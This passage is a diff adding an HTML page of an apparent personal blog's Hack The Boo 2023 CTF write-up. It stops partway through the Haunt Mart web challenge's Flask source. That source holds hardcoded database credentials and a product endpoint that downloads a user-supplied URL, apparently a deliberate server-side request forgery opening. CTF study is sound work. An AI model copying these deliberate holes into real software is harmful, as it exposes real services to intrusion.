@@ -1,0 +1,1315 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Participated in the 2023 Hack The Boo competition. Each category contained 2 challenges, and I managed to complete the web category and part of forensics.">
+<title>Hack The Boo 2023</title>
+
+<link rel='canonical' href='http://localhost:1313/p/hack-the-boo-2023/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Hack The Boo 2023">
+<meta property='og:description' content="Participated in the 2023 Hack The Boo competition. Each category contained 2 challenges, and I managed to complete the web category and part of forensics.">
+<meta property='og:url' content='http://localhost:1313/p/hack-the-boo-2023/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Forensics' /><meta property='article:tag' content='CSRF' /><meta property='article:tag' content='SSTI' /><meta property='article:tag' content='Wireshark' /><meta property='article:published_time' content='2023-10-30T17:08:25-05:00'/><meta property='article:modified_time' content='2023-10-30T17:08:25-05:00'/>
+<meta name="twitter:title" content="Hack The Boo 2023">
+<meta name="twitter:description" content="Participated in the 2023 Hack The Boo competition. Each category contained 2 challenges, and I managed to complete the web category and part of forensics.">
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#web">Web</a>
+      <ol>
+        <li><a href="#haunt-mart">Haunt Mart</a></li>
+        <li><a href="#ghostly-templates">Ghostly Templates</a></li>
+      </ol>
+    </li>
+    <li><a href="#forensics">Forensics</a>
+      <ol>
+        <li><a href="#trick-or-treat">Trick or Treat</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/ctf/" >
+                CTF
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hack-the-boo-2023/">Hack The Boo 2023</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Participated in the 2023 Hack The Boo competition. Each category contained 2 challenges, and I managed to complete the web category and part of forensics.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 30, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    10 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="web">Web
+</h2><h3 id="haunt-mart">Haunt Mart
+</h3><blockquote>
+<p>An eerie expedition into the world of online retail, where the most sinister and spine-tingling inventory reigns supreme. Can you take it down?</p>
+</blockquote>
+<hr>
+<p>Checking source code:
+config.py:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">application.util</span> <span class="kn">import</span> <span class="n">generate</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Config</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="n">generate</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MYSQL_HOST</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MYSQL_USER</span> <span class="o">=</span> <span class="s1">&#39;xclow3n&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MYSQL_PASSWORD</span> <span class="o">=</span> <span class="s1">&#39;xclow3n&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MYSQL_DB</span> <span class="o">=</span> <span class="s1">&#39;hauntmart&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FLAG</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/flag.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ProductionConfig</span><span class="p">(</span><span class="n">Config</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DevelopmentConfig</span><span class="p">(</span><span class="n">Config</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">TestingConfig</span><span class="p">(</span><span class="n">Config</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">TESTING</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see our flag is set as a FLAG variable, and also note that DEBUG/TESTING is set to true.
+The route is also intersting:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">application.database</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Blueprint</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">current_app</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">application.util</span> <span class="kn">import</span> <span class="n">response</span><span class="p">,</span> <span class="n">isAuthenticated</span><span class="p">,</span> <span class="n">generateToken</span><span class="p">,</span> <span class="n">isFromLocalhost</span><span class="p">,</span> <span class="n">downloadManual</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">web</span> <span class="o">=</span> <span class="n">Blueprint</span><span class="p">(</span><span class="s1">&#39;web&#39;</span><span class="p">,</span> <span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">api</span> <span class="o">=</span> <span class="n">Blueprint</span><span class="p">(</span><span class="s1">&#39;api&#39;</span><span class="p">,</span> <span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@web.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">loginView</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@web.route</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">registerView</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;register.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@web.route</span><span class="p">(</span><span class="s1">&#39;/home&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@isAuthenticated</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">homeView</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">,</span> <span class="n">flag</span><span class="o">=</span><span class="n">current_app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;FLAG&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@web.route</span><span class="p">(</span><span class="s1">&#39;/product&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@isAuthenticated</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">productView</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;product.html&#39;</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@web.route</span><span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@api.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">api_login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="o">.</span><span class="n">is_json</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;Invalid JSON!&#39;</span><span class="p">),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;All fields are required!&#39;</span><span class="p">),</span> <span class="mi">401</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">loginUserDb</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">token</span> <span class="o">=</span> <span class="n">generateToken</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">),</span> <span class="n">user</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;role&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">token</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;Success&#39;</span><span class="p">),</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;Invalid credentials!&#39;</span><span class="p">),</span> <span class="mi">403</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@api.route</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">api_register</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="o">.</span><span class="n">is_json</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;Invalid JSON!&#39;</span><span class="p">),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">username</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;All fields are required!&#39;</span><span class="p">),</span> <span class="mi">401</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">registerUserDb</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;User registered! Please login&#39;</span><span class="p">),</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;User already exists!&#39;</span><span class="p">),</span> <span class="mi">403</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@api.route</span><span class="p">(</span><span class="s1">&#39;/product&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@isAuthenticated</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sellProduct</span><span class="p">(</span><span class="n">user</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="o">.</span><span class="n">is_json</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;Invalid JSON!&#39;</span><span class="p">),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">price</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;price&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">description</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;description&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">manualUrl</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;manual&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">name</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">price</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">description</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">manualUrl</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;All fields are required!&#39;</span><span class="p">),</span> <span class="mi">401</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">manualPath</span> <span class="o">=</span> <span class="n">downloadManual</span><span class="p">(</span><span class="n">manualUrl</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">manualPath</span><span class="p">):</span>
